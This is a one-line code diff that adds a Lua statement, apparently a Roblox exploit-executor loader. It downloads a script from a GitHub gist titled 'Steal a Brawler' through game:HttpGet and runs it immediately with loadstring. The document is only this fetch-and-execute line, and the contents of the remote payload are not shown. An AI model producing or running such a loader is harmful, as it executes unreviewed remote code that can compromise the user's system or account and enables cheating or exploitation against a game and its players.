@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/Defy-cloud/58f4b2ec4d21609df5dd0b2eb861d447/raw/d3d934dd8f276e33b4c231f5142a16161b169f52/Steal%2520a%2520Brawler"))()
